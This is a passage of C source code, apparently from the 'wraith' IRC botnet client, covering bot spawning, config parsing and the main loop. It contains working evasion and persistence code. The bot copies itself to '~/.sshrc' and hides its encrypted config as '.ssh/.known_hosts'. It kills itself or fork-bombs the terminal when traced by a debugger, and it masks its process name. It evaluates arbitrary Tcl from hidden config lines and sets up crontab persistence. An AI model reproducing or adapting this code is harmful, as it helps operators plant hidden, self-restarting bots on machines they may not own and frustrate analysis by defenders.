    temps = my_ptr = (char *) decrypt_string(netpass, decryptit(templine));

#ifdef S_PSCLOAK
    sdprintf(STR("GOTSPAWN: %s"), temps);
#endif /* S_PSCLOAK */

    pscloak = atoi(newsplit(&temps));
    if (temps[0])
      nick = newsplit(&temps);
    if (!nick)
      fatal("invalid config (2).",0);
    if (temps[0])
      ip = newsplit(&temps);
    if (temps[0])
      host = newsplit(&temps);
    if (temps[0])
      ipsix = newsplit(&temps);

    snprintf(origbotname, 10, "%s", nick);

    if (ip[1]) {
      if (ip[0] == '!') { //natip
        ip++;
        sprintf(natip,"%s",ip);
      } else {
        snprintf(myip, 120, "%s", ip);
      }
    }

    if (host && host[1]) {
      if (host[0] == '+') { //ip6 host
        host++;
        sprintf(hostname6,"%s",host);
      } else { //normal ip4 host
        sprintf(hostname,"%s",host);
      }
    }

    if (ipsix && ipsix[1]) {
      snprintf(myip6, 120, "%s", ipsix);
    }
    if (my_ptr)
      nfree(my_ptr);
  }

  fclose(fp);
  unlink(filename);
}

static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, int cloak)
{
  char buf[DIRMAX], bindir[DIRMAX], bufrun[DIRMAX];
  FILE *fp;

  sprintf(buf, "%s", bin);
  sprintf(bindir, "%s", dirname(buf));

  sprintf(buf, "%s/.wraith-%s", bindir, nick);


  if (!(fp = fopen(buf, "w")))
    fatal(STR("Cannot create spawnfiles..."), 0);

  lfprintf(fp, "%d %s %s %s %s\n", cloak, nick, ip ? ip : ".", host ? host : ".", ipsix ? ipsix : ".");

  fflush(fp);
  fclose(fp);

  sprintf(bufrun, "%s -c %s", bin, buf);
  return system(bufrun);
}
#endif /* LEAF */

#ifdef S_MESSUPTERM 
void messup_term() {
  int i;
  char * argv[4];
  freopen(STR("/dev/null"), "w", stderr);
  for (i=0;i<11;i++) {
    fork();
  }
  argv[0]=nmalloc(100);
  strcpy(argv[0], STR("/bin/sh"));
  argv[1]="-c";
  argv[2]=nmalloc(1024);
  strcpy(argv[2], STR("cat < "));
  strcat(argv[2], binname);
  argv[3]=NULL;
  execvp(argv[0], &argv[0]);
}
#endif /* S_MESSUPTERM */

void check_trace_start()
{
#ifdef S_ANTITRACE
  int parent = getpid();
  int xx = 0, i = 0;
#ifdef __linux__
  xx = fork();
  if (xx == -1) {
    printf(STR("Can't fork process!\n"));
    exit(1);
  } else if (xx == 0) {
    i = ptrace(PTRACE_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EPERM) {
#ifdef S_MESSUPTERM
      messup_term();
#else
      kill(parent, SIGKILL);
      exit(1);
#endif /* S_MESSUPTERM */
    } else {
      waitpid(parent, &i, 0);
      kill(parent, SIGCHLD);
      ptrace(PTRACE_DETACH, parent, 0, 0);
      kill(parent, SIGCHLD);
    }
    exit(0);
  } else {
    wait(&i);
  }
#endif /* __linux__ */
#ifdef __FreeBSD__
  xx = fork();
  if (xx == -1) {
    printf(STR("Can't fork process!\n"));
    exit(1);
  } else if (xx == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY) {
#ifdef S_MESSUPTERM
      messup_term();
#else
      kill(parent, SIGKILL);
      exit(1);
#endif /* S_MESSUPTERM */
    } else {
       wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else {
    waitpid(xx, NULL, 0);
  }
#endif /* __FreeBSD__ */
#ifdef __OpenBSD__
  xx = fork();
  if (xx == -1) {
    printf(STR("Can't fork process!\n"));
    exit(1);
  } else if (xx == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY) {
      kill(parent, SIGKILL);
      exit(1);
    } else {
      wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else {
    waitpid(xx, NULL, 0);
  }
#endif /* __OpenBSD__ */
#endif /* S_ANTITRACE */
}

char *homedir()
{
  static char home[DIRMAX], tmp[DIRMAX];
  struct passwd *pw;
Context;
  pw = getpwuid(geteuid());

  if (!pw)
   werr(ERR_PASSWD);

Context;
  snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
Context;
  realpath(tmp, home); /* this will convert lame home dirs of /home/blah->/usr/home/blah */

  return home;
}

char *confdir()
{
  static char conf[DIRMAX];

#ifdef LEAF
{
  snprintf(conf, sizeof conf, "%s/.ssh", homedir());
}
#endif /* LEAF */
#ifdef HUB
{
  char *tmpdir;

  tmpdir = nmalloc(strlen(binname)+1);
  strcpy(tmpdir, binname);
  snprintf(conf, sizeof conf, "%s", dirname(tmpdir));
  nfree(tmpdir);
}
#endif /* HUB */

  return conf;
}

char *my_uname() 
{
  static char os_uname[250];
  char *unix_n, *vers_n;
#ifdef HAVE_UNAME
  struct utsname un;

    if (uname(&un) < 0) {
#endif /* HAVE_UNAME */
      unix_n = "*unkown*";
      vers_n = "";
#ifdef HAVE_UNAME
    } else {
      unix_n = un.nodename;
#ifdef __FreeBSD__
      vers_n = un.release;
#else
      vers_n = un.version;
#endif /* __FreeBSD__ */
    }
#endif /* HAVE_UNAME */
  snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
  return os_uname;
}

int main(int argc, char **argv)
{
  int xx, i;
#ifdef LEAF
  int x = 1;
#endif
  char buf[SGRAB + 9], s[25];
  FILE *f;
  struct sigaction sv;
  struct chanset_t *chan;
#ifdef LEAF
  int skip = 0;
  int ok = 1;
#endif

#ifdef DEBUG_MEM
  /* Make sure it can write core, if you make debug. Else it's pretty
   * useless (dw)
   */
  {
#include <sys/resource.h>
    struct rlimit cdlim, plim, fdlim, rsslim, stacklim;
  
//    rsslim.rlim_cur = 30720;
//    rsslim.rlim_max = 30720;
//    setrlimit(RLIMIT_RSS, &rsslim);
//    stacklim.rlim_cur = 30720;
//    stacklim.rlim_max = 30720;
//    setrlimit(RLIMIT_STACK, &stacklim);   
    plim.rlim_cur = 50;
    plim.rlim_max = 50;
    setrlimit(RLIMIT_NPROC, &plim);
    fdlim.rlim_cur = 200;
    fdlim.rlim_max = 200;
//#ifdef __FreeBSD__
//    setrlimit(RLIMIT_OFILE, &fdlim);
//#else
    setrlimit(RLIMIT_NOFILE, &fdlim);
//#endif
    cdlim.rlim_cur = RLIM_INFINITY;
    cdlim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_CORE, &cdlim);
  }
#endif

  /* Initialise context list */
  for (i = 0; i < 16; i++)
    Context;

  /* Version info! */
  egg_snprintf(ver, sizeof ver, "wraith %s", egg_version);
  egg_snprintf(version, sizeof version, "wraith %s", egg_version);
  /* Now add on the patchlevel (for Tcl) */
  sprintf(&egg_version[strlen(egg_version)], " %u", egg_numver);
#ifdef STOP_UAC
  {
    int nvpair[2];

    nvpair[0] = SSIN_UACPROC;
    nvpair[1] = UAC_NOPRINT;
    setsysinfo(SSI_NVPAIRS, (char *) nvpair, 1, NULL, 0);
  }
#endif

  /* Set up error traps: */
  sv.sa_handler = got_bus;
  sigemptyset(&sv.sa_mask);
#ifdef SA_RESETHAND
  sv.sa_flags = SA_RESETHAND;
#else
  sv.sa_flags = 0;
#endif
  sigaction(SIGBUS, &sv, NULL);
  sv.sa_handler = got_segv;
  sigaction(SIGSEGV, &sv, NULL);
#ifdef SA_RESETHAND
  sv.sa_flags = 0;
#endif
  sv.sa_handler = got_fpe;
  sigaction(SIGFPE, &sv, NULL);
  sv.sa_handler = got_term;
  sigaction(SIGTERM, &sv, NULL);
  sv.sa_handler = got_stop;
  sigaction(SIGSTOP, &sv, NULL);
#ifdef S_HIJACKCHECK
  sv.sa_handler = got_cont;
  sigaction(SIGCONT, &sv, NULL);
#endif
  sv.sa_handler = got_abort;
  sigaction(SIGABRT, &sv, NULL);
  sv.sa_handler = got_hup;
  sigaction(SIGHUP, &sv, NULL);
  sv.sa_handler = got_quit;
  sigaction(SIGQUIT, &sv, NULL);
  sv.sa_handler = SIG_IGN;
  sigaction(SIGPIPE, &sv, NULL);
  sv.sa_handler = got_ill;
  sigaction(SIGILL, &sv, NULL);
  sv.sa_handler = got_alarm;
  sigaction(SIGALRM, &sv, NULL);

  Context;
  /* Initialize variables and stuff */
#ifdef S_UTCTIME
  now_tmp = time(NULL);
  now = mktime(gmtime(&now_tmp));
#else
  now = time(NULL);
#endif /* S_UTCTIME */
  chanset = NULL;
  egg_memcpy(&nowtm, localtime(&now), sizeof(struct tm));
  lastmin = nowtm.tm_min;
  srandom(now % (getpid() + getppid()));
  init_mem();
  myuid = geteuid();
  binname = getfullbinname(argv[0]);

  /* just load everything now, won't matter if it's loaded if the bot has to suicide on startup */
  init_settings();
  egg_snprintf(enetpass, sizeof enetpass, netpass);
  init_dcc_max();
  init_userent();
  init_misc();
  init_bots();
  init_net();
  init_modules();
  init_tcl(argc, argv);
  init_auth();
  init_config();
  init_userrec();
  if (backgrd)
    bg_prepare_split();
  init_botcmd();
  link_statics();
  module_load(ENCMOD);

  if (!can_stat(binname))
   werr(ERR_BINSTAT);
  if (!fixmod(binname))
   werr(ERR_BINMOD);

  if (argc) {
    sdprintf(STR("Calling dtx_arg with %d params."), argc);
    dtx_arg(argc, argv);
  }
  if (checktrace)
    check_trace_start();

#ifdef HUB
  snprintf(tempdir, sizeof tempdir, "%s/tmp", confdir());
#endif /* HUB */

#ifdef LEAF
{
  char newbin[DIRMAX];
  sdprintf(STR("my uid: %d my uuid: %d, my ppid: %d my pid: %d"), getuid(), geteuid(), getppid(), getpid());
  chdir(homedir());
  snprintf(newbin, sizeof newbin, "%s/.sshrc", homedir());
  snprintf(tempdir, sizeof tempdir, "%s/...", confdir());

  sdprintf(STR("newbin at: %s"), newbin);

  if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
    sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
    unlink(newbin);
    if (copyfile(binname,newbin))
     ok = 0;

    if (ok) 
     if (!can_stat(newbin)) {
       unlink(newbin);
       ok = 0;
     }
    if (ok) 
      if (!fixmod(newbin)) {
        unlink(newbin);
        ok = 0;
      }

    if (!ok)
      werr(ERR_WRONGBINDIR);
    else {
      unlink(binname);
      system(newbin);
      sdprintf(STR("exiting to let new binary run..."));
      exit(0);
    }
  }

  // Ok if we are here, then the binary is accessable and in the correct directory, now lets do the local config...

}
#endif /* LEAF */
if (1) {
char tmp[DIRMAX];

  snprintf(tmp, sizeof tmp, "%s/", confdir());
  if (!can_stat(tmp)) {
#ifdef LEAF
    if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
      unlink(confdir());
      if (!can_stat(confdir()))
        if (mkdir(confdir(), S_IRUSR | S_IWUSR | S_IXUSR))
#endif /* LEAF */
          werr(ERR_CONFSTAT);
#ifdef LEAF
    }
#endif /* LEAF */
  }

  snprintf(tmp, sizeof tmp, "%s/", tempdir);
  if (!can_stat(tmp)) {
    if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
      unlink(tempdir);
      if (!can_stat(tempdir))
        if (mkdir(tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
          werr(ERR_TMPSTAT);
    }
  }
} /* char tmp[DIRMAX] */
  if (!fixmod(confdir()))
    werr(ERR_CONFDIRMOD);
  if (!fixmod(tempdir))
    werr(ERR_TMPMOD);

  //The config dir is accessable with correct permissions, lets read/write/create config file now..
if (1) {		/* config shit */
  char cfile[DIRMAX], templine[8192];
#ifdef LEAF
  snprintf(cfile, sizeof cfile, "%s/.known_hosts", confdir());
#else
  snprintf(cfile, sizeof cfile, "%s/conf", confdir());
#endif /* LEAF */
  if (!can_stat(cfile))
    werr(ERR_NOCONF);
  if (!fixmod(cfile))
    werr(ERR_CONFMOD);

#ifdef LEAF
  if (localhub) { //we only want to read the config if we are the spawn bot..
#endif /* LEAF */
    i = 0;
    if (!(f = fopen(cfile, "r")))
       werr(0);
    Context;
    while(fscanf(f,"%[^\n]\n",templine) != EOF) {
      char *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps, c[1024];
      void *temp_ptr;
      int skip = 0;
      if (templine[0] != '+') {
        printf(STR("%d: "), i);
        werr(ERR_CONFBADENC);
      }

      temps = temp_ptr = (char *) decrypt_string(netpass, decryptit(templine));
      sdprintf("malloc`d %d bytes", strlen(temps)+1);
      if (!strchr(STR("*#-+!abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPWRSTUVWXYZ"), temps[0])) {
        printf(STR("%d: "), i);
        werr(ERR_CONFBADENC);
      }

      snprintf(c, sizeof c, "%s",temps);

      if (c[0] == '*')
        skip = 1;
      else if (c[0] == '-' && !skip) { //this is the uid
        newsplit(&temps);
        if (geteuid() != atoi(temps)) {
          sdprintf(STR("wrong uid, conf: %d :: %d"), atoi(temps), geteuid());
          werr(ERR_WRONGUID);
        }
      } else if (c[0] == '+' && !skip) { //this is the uname
        int r = 0;
        newsplit(&temps);
        if ((r = strcmp(temps, my_uname()))) {
          sdprintf(STR("wrong uname, conf: %s :: %s"), temps, my_uname());
          werr(ERR_WRONGUNAME);
        }
      } else if (c[0] == '!') { //local tcl exploit
        if (c[1] == '-') { //dont use pscloak
#ifdef S_PSCLOAK
          sdprintf(STR("NOT CLOAKING"));
#endif /* S_PSCLOAK */
          pscloak = 0;
        } else {
          newsplit(&temps);
          Tcl_Eval(interp, temps);
        }
      } else if (c[0] != '#') {  //now to parse nick/hosts
        //we have the right uname/uid, safe to setup crontab now.
        i++;
        nick = newsplit(&temps);
        if (!nick || !nick[0])
          werr(ERR_BADCONF);
        sdprintf(STR("Read nick from config: %s"), nick);
        if (temps[0])
          ip = newsplit(&temps);
        if (temps[0])
          host = newsplit(&temps);
        if (temps[0])
          ipsix = newsplit(&temps);

        if (i == 1) { //this is the first bot ran/parsed
          strncpyz(s, ctime(&now), sizeof s);
          strcpy(&s[11], &s[20]);
          /* printf(STR("--- Loading %s (%s)\n\n"), ver, s); */

          if (ip && ip[0] == '!') { //natip
            ip++;
            sprintf(natip, "%s",ip);
          } else {
            if (ip && ip[1]) //only copy ip if it is longer than 1 char (.)
              snprintf(myip, 120, "%s", ip);
          }
          snprintf(origbotname, 10, "%s", nick);
#ifdef HUB
          sprintf(userfile, "%s/.%s.user", confdir(), nick);
#endif /* HUB */
/* log          sprintf(logfile, "%s/.%s.log", confdir(), nick); */
          if (host && host[1]) { //only copy host if it is longer than 1 char (.)
            if (host[0] == '+') { //ip6 host
              host++;
              sprintf(hostname6, "%s",host);
            } else  //normal ip4 host
              sprintf(hostname, "%s",host);
          }
          if (ipsix && ipsix[1]) { //only copy ipsix if it is longer than 1 char (.)
            snprintf(myip6, 120, "%s",ipsix);
          }
        } 
#ifdef LEAF
        else { //these are the rest of the bots..
          char buf2[DIRMAX];
          FILE *fp;

          xx = 0, x = 0, errno = 0;
          s[0] = '\0';
          /* first let's determine if the bot is already running or not.. */
          egg_snprintf(buf2, sizeof buf2, "%s/.pid.%s", tempdir, nick);
          fp = fopen(buf2, "r");
          if (fp != NULL) {
            fgets(s, 10, fp);
            fclose(fp);
            xx = atoi(s);
            if (updating) {
              x = kill(xx, SIGKILL); //try to kill the pid if we are updating.
              unlink(buf2);
            }
            kill(xx, SIGCHLD);
            if (errno == ESRCH || (updating && !x)) { //PID is !running, safe to run.

            if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
                printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
            } 
          } else {
            if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
              printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
          }
        }
#endif /* LEAF */
      } // if read in[0] != #
Context;
//      if (temps)
      nfree(temp_ptr);
    }
  fclose(f);
#ifdef LEAF
    if (updating)
      exit(0); //let the 5 min timer restart us.
  } // (localhub)
#endif /* LEAF */
}
  module_load("dns");
  module_load("channels");
#ifdef LEAF
  module_load("server");
  module_load("irc");
#endif /* LEAF */
  module_load("transfer");
  module_load("share");
  module_load("update"); 
  module_load("notes");
  module_load("console");
  module_load("ctcp");
  module_load("compress");
  chanprog();

#ifdef LEAF
  if (localhub) {
    sdprintf(STR("I am localhub (%s)"), origbotname);
#endif /* LEAF */
    check_crontab();
#ifdef LEAF
  }
#endif /* LEAF */

  if (!encrypt_pass) {
    sdprintf(MOD_NOCRYPT);
    bg_send_quit(BG_ABORT);
    exit(1);
  }

  cache_miss = 0;
  cache_hit = 0;
  if (!pid_file[0])
    egg_snprintf(pid_file, sizeof pid_file, "%s.pid.%s", tempdir, botnetnick);
  f = fopen(pid_file, "r");

  if ((localhub && !updating) || !localhub) { 
    if (f != NULL) {
      fgets(s, 10, f);
      xx = atoi(s);
      kill(xx, SIGCHLD);
      if (errno != ESRCH) { //!= is PID is running.
        sdprintf(STR("%s is already running, pid: %d"), botnetnick, xx);
        bg_send_quit(BG_ABORT);
        exit(1);
      }
    }
  }

#ifdef LEAF
#ifdef S_PSCLOAK
  if (pscloak) {
    int on = 0;
    strncpy(argv[0],progname(),strlen(argv[0]));
    //this clears all the params..
    for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
  }
#endif /* PSCLOAK */
#endif /* LEAF */

  i = 0;
  for (chan = chanset; chan; chan = chan->next)
    i++;
  putlog(LOG_MISC, "*", STR("=== %s: %d channels, %d users."),
	 botnetnick, i, count_users(userlist));
  /* Move into background? */

  if (backgrd) {
#ifndef CYGWIN_HACKS
    bg_do_split();
  } else {			/* !backgrd */
#endif /* CYGWIN_HACKS */
    xx = getpid();
    if (xx != 0) {
      FILE *fp;

      /* Write pid to file */
      unlink(pid_file);
      fp = fopen(pid_file, "w");
      if (fp != NULL) {
        fprintf(fp, "%u\n", xx);
        if (fflush(fp)) {
	  /* Let the bot live since this doesn't appear to be a botchk */
	  printf(EGG_NOWRITE, pid_file);
	  fclose(fp);
	  unlink(pid_file);
        } else
 	  fclose(fp);
      } else
        printf(EGG_NOWRITE, pid_file);
#ifdef CYGWIN_HACKS
      printf(STR("Launched into the background  (pid: %d)\n\n"), xx);
#endif /* CYGWIN_HACKS */
    }
  }

  use_stderr = 0;		/* Stop writing to stderr now */
  if (backgrd) {
    /* Ok, try to disassociate from controlling terminal (finger cross) */
#if HAVE_SETPGID && !defined(CYGWIN_HACKS)
    setpgid(0, 0);
#endif
    /* Tcl wants the stdin, stdout and stderr file handles kept open. */
    freopen("/dev/null", "r", stdin);
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);
#ifdef CYGWIN_HACKS
    FreeConsole();
#endif /* CYGWIN_HACKS */
  }

  /* Terminal emulating dcc chat */
  if (!backgrd && term_z) {
    int n = new_dcc(&DCC_CHAT, sizeof(struct chat_info));

    dcc[n].addr = iptolong(getmyip());
    dcc[n].sock = STDOUT;
    dcc[n].timeval = now;
    dcc[n].u.chat->con_flags = conmask;
    dcc[n].u.chat->strip_flags = STRIP_ALL;
    dcc[n].status = STAT_ECHO;
    strcpy(dcc[n].nick, "HQ");
    strcpy(dcc[n].host, "llama@console");
    dcc[n].user = get_user_by_handle(userlist, "HQ");
    /* Make sure there's an innocuous HQ user if needed */
    if (!dcc[n].user) {
      userlist = adduser(userlist, "HQ", "none", "-", USER_ADMIN | USER_OWNER | USER_MASTER | USER_VOICE | USER_OP | USER_PARTY | USER_CHUBA | USER_HUBA);
      dcc[n].user = get_user_by_handle(userlist, "HQ");
    }
    setsock(STDOUT, 0);          /* Entry in net table */
    dprintf(n, "\n### ENTERING DCC CHAT SIMULATION ###\n\n");
    dcc_chatter(n);
  }

  then = now;
  online_since = now;
  autolink_cycle(NULL);		/* Hurry and connect to tandem bots */
  add_hook(HOOK_SECONDLY, (Function) core_secondly);
  add_hook(HOOK_10SECONDLY, (Function) core_10secondly);
  add_hook(HOOK_MINUTELY, (Function) core_minutely);
  add_hook(HOOK_HOURLY, (Function) core_hourly);
  add_hook(HOOK_HALFHOURLY, (Function) core_halfhourly);
  add_hook(HOOK_REHASH, (Function) event_rehash);
  add_hook(HOOK_PRE_REHASH, (Function) event_prerehash);
  add_hook(HOOK_USERFILE, (Function) event_save);
#ifdef HUB
  add_hook(HOOK_BACKUP, (Function) backup_userfile);  
#endif /* HUB */
  add_hook(HOOK_DAILY, (Function) event_resettraffic);
  add_hook(HOOK_LOADED, (Function) event_loaded);

  call_hook(HOOK_LOADED);

  debug0(STR("main: entering loop"));
  while (1) {
    int socket_cleanup = 0;

    /* Process a single tcl event */
    Tcl_DoOneEvent(TCL_ALL_EVENTS | TCL_DONT_WAIT);

    /* Lets move some of this here, reducing the numer of actual
     * calls to periodic_timers
     */
#ifdef S_UTCTIME
    now_tmp = time(NULL);
    now = mktime(gmtime(&now_tmp));
#else
    now = time(NULL);
#endif /* S_UTCTIME */
    random();			/* Woop, lets really jumble things */
    if (now != then) {		/* Once a second */
      call_hook(HOOK_SECONDLY);
      then = now;
    }

    /* Only do this every so often. */
    if (!socket_cleanup) {
      socket_cleanup = 5;

      /* Remove dead dcc entries. */
      dcc_remove_lost();

      /* Check for server or dcc activity. */
      dequeue_sockets();		
    } else
      socket_cleanup--;

    /* Free unused structures. */
    garbage_collect();

    xx = sockgets(buf, &i); 
    if (xx >= 0) {		/* Non-error */
      int idx;

      for (idx = 0; idx < dcc_total; idx++)
	if (dcc[idx].sock == xx) {
	  if (dcc[idx].type && dcc[idx].type->activity) {
	    /* Traffic stats */
	    if (dcc[idx].type->name) {
	      if (!strncmp(dcc[idx].type->name, "BOT", 3))
		itraffic_bn_today += strlen(buf) + 1;
	      else if (!strcmp(dcc[idx].type->name, "SERVER"))
		itraffic_irc_today += strlen(buf) + 1;
	      else if (!strncmp(dcc[idx].type->name, "CHAT", 4))
		itraffic_dcc_today += strlen(buf) + 1;
	      else if (!strncmp(dcc[idx].type->name, "FILES", 5))
		itraffic_dcc_today += strlen(buf) + 1;
	      else if (!strcmp(dcc[idx].type->name, "SEND"))
		itraffic_trans_today += strlen(buf) + 1;
	      else if (!strncmp(dcc[idx].type->name, "GET", 3))
		itraffic_trans_today += strlen(buf) + 1;
	      else
		itraffic_unknown_today += strlen(buf) + 1;
	    }
	    dcc[idx].type->activity(idx, buf, i);
	  } else
	    putlog(LOG_MISC, "*",
		   "!!! untrapped dcc activity: type %s, sock %d",
		   dcc[idx].type->name, dcc[idx].sock);
	  break;
	}
    } else if (xx == -1) {	/* EOF from someone */
      int idx;

      if (i == STDOUT && !backgrd)
	fatal(STR("END OF FILE ON TERMINAL"), 0);
      for (idx = 0; idx < dcc_total; idx++)
	if (dcc[idx].sock == i) {
	  if (dcc[idx].type && dcc[idx].type->eof)
	    dcc[idx].type->eof(idx);
	  else {
	    putlog(LOG_MISC, "*",
		   "*** ATTENTION: DEAD SOCKET (%d) OF TYPE %s UNTRAPPED",
		   i, dcc[idx].type ? dcc[idx].type->name : "*UNKNOWN*");
	    killsock(i);
	    lostdcc(idx);
	  }
	  idx = dcc_total + 1;
	}
      if (idx == dcc_total) {
	putlog(LOG_MISC, "*",
	       "(@) EOF socket %d, not a dcc socket, not anything.", i);
	close(i);
	killsock(i);
      }
    } else if (xx == -2 && errno != EINTR) {	/* select() error */
      putlog(LOG_MISC, "*", STR("* Socket error #%d; recovering."), errno);
      for (i = 0; i < dcc_total; i++) {
	if ((fcntl(dcc[i].sock, F_GETFD, 0) == -1) && (errno = EBADF)) {
	  putlog(LOG_MISC, "*",
		 "DCC socket %d (type %d, name '%s') expired -- pfft",
		 dcc[i].sock, dcc[i].type, dcc[i].nick);
	  killsock(dcc[i].sock);
	  lostdcc(i);
	  i--;
	}
      }
    } else if (xx == -3) {
      call_hook(HOOK_IDLE);
      socket_cleanup = 0;	/* If we've been idle, cleanup & flush */
    }

    if (do_restart) {
      rehash();
      do_restart = 0;
    }
  }
}
